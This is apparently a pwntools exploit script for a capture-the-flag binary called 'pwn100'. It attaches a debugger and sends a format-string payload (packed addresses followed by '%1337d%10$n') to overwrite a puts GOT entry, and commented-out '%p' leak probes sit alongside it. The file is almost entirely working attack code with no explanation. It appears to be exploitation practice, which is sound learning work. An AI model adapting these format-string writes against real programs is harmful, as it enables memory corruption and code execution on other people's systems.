from pwn import *

def debug(r):
	gdb.attach(r,'''
	break * 0x0000555555554BFE
	break * 0x0000555555554B60
	break * 0x000555555554C88
	c
	''')	

context(os='linux', arch='amd64')
r=process("./pwn100")
debug(r)

#b * _dl_runtime_resolve_sse+154
#break * _dl_runtime_resolve_sse+159
#b *_dl_fixup+279
#break * 0x0000555555554DF0
#break * 0x0000555555554B60
#set  *((long *)0x7fffffffdd20)=0x0000555555756028
s="/AAAABBBB"+".%p"*30
puts_GOT=	0x55555575602b
#%9999d%32%n
print r.recvuntil(":")
#r.sendline("*\x60\x75\x55\x55\x55\x00\x00%1337x%10$p")
r.sendline('*\x60\x75\x55\x55\x55\x41\x41%1337d%10\$n')
#r.sendline(p64(puts_GOT)+"%10$p")
#r.sendline(s)
print r.recvuntil("Operand 1:")
r.sendline("A"*10)
print r.recvuntil("Operand 2:")
r.sendline("B"*10)
print r.recv(1024)
r.interactive()
r.close()
